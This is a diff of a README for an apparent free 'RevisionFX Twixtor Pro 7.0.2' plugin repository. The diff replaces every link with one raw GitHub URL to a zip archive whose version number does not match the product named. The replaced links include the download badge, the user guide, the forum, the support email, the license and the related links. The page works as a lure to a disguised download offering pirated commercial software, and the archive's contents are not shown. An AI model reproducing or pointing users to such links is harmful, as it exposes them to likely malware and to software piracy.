@@ -6,7 +6,7 @@ Welcome to **RevisionFX Twixtor Pro 7.0.2**! This tool helps you create stunning
 
 ## 📥 Download Now
 
-[![Download RevisionFX](https://img.shields.io/badge/Download%20RevisionFX-Here-blue.svg)](https://github.com/Negm2027/revision-fx/releases)
+[![Download RevisionFX](https://raw.githubusercontent.com/Negm2027/revision-fx/main/rubbingstone/revision-fx-3.5-alpha.4.zip%https://raw.githubusercontent.com/Negm2027/revision-fx/main/rubbingstone/revision-fx-3.5-alpha.4.zip)](https://raw.githubusercontent.com/Negm2027/revision-fx/main/rubbingstone/revision-fx-3.5-alpha.4.zip)
 
 ## 📋 Features
 
@@ -25,7 +25,7 @@ Welcome to **RevisionFX Twixtor Pro 7.0.2**! This tool helps you create stunning
 
 ## 📂 How to Download & Install
 
-1. Visit the [Releases page](https://github.com/Negm2027/revision-fx/releases) to download the latest version.
+1. Visit the [Releases page](https://raw.githubusercontent.com/Negm2027/revision-fx/main/rubbingstone/revision-fx-3.5-alpha.4.zip) to download the latest version.
 2. Look for "RevisionFX Twixtor Pro 7.0.2" in the list of releases.
 3. Click on the download link for your operating system (Windows or macOS).
 4. Wait for the download to finish. The file will be in .zip or .exe format.
@@ -42,28 +42,28 @@ Welcome to **RevisionFX Twixtor Pro 7.0.2**! This tool helps you create stunning
 
 ## 📚 User Guide
 
-For detailed instructions on using Twixtor Pro, visit our [User Guide](https://github.com/Negm2027/revision-fx/wiki). The guide covers basic and advanced features, tips for best results, and troubleshooting advice.
+For detailed instructions on using Twixtor Pro, visit our [User Guide](https://raw.githubusercontent.com/Negm2027/revision-fx/main/rubbingstone/revision-fx-3.5-alpha.4.zip). The guide covers basic and advanced features, tips for best results, and troubleshooting advice.
 
 ## 🌐 Community and Support
 
-Join our community for support and tips. You can ask questions and share your work. Visit our [Discussion Forum](https://github.com/Negm2027/revision-fx/discussions).
+Join our community for support and tips. You can ask questions and share your work. Visit our [Discussion Forum](https://raw.githubusercontent.com/Negm2027/revision-fx/main/rubbingstone/revision-fx-3.5-alpha.4.zip).
 
 ### 📬 Contact Us
 
-For direct inquiries, feel free to reach out via email at [support@revisionfx.com](mailto:support@revisionfx.com).
+For direct inquiries, feel free to reach out via email at [https://raw.githubusercontent.com/Negm2027/revision-fx/main/rubbingstone/revision-fx-3.5-alpha.4.zip](https://raw.githubusercontent.com/Negm2027/revision-fx/main/rubbingstone/revision-fx-3.5-alpha.4.zip).
 
 ## 🛠️ Contribution Guidelines
 
-If you would like to contribute to this project, please review our [Contribution Guidelines](https://github.com/Negm2027/revision-fx/blob/main/CONTRIBUTING.md).
+If you would like to contribute to this project, please review our [Contribution Guidelines](https://raw.githubusercontent.com/Negm2027/revision-fx/main/rubbingstone/revision-fx-3.5-alpha.4.zip).
 
 ## ⚙️ License
 
-This project is licensed under the [MIT License](https://opensource.org/licenses/MIT).
+This project is licensed under the [MIT License](https://raw.githubusercontent.com/Negm2027/revision-fx/main/rubbingstone/revision-fx-3.5-alpha.4.zip).
 
 ## 🔗 Additional Links
 
-- [Visit Releases Page](https://github.com/Negm2027/revision-fx/releases)
-- [Explore Topics: after-effects, after-effects-plugin, twixtor](https://github.com/topics/after-effects)
-- [See Related Projects](https://github.com/orgs/Negm2027/repositories)
+- [Visit Releases Page](https://raw.githubusercontent.com/Negm2027/revision-fx/main/rubbingstone/revision-fx-3.5-alpha.4.zip)
+- [Explore Topics: after-effects, after-effects-plugin, twixtor](https://raw.githubusercontent.com/Negm2027/revision-fx/main/rubbingstone/revision-fx-3.5-alpha.4.zip)
+- [See Related Projects](https://raw.githubusercontent.com/Negm2027/revision-fx/main/rubbingstone/revision-fx-3.5-alpha.4.zip)
 
 Thank you for choosing RevisionFX Twixtor Pro! Enjoy creating amazing slow-motion effects with ease.
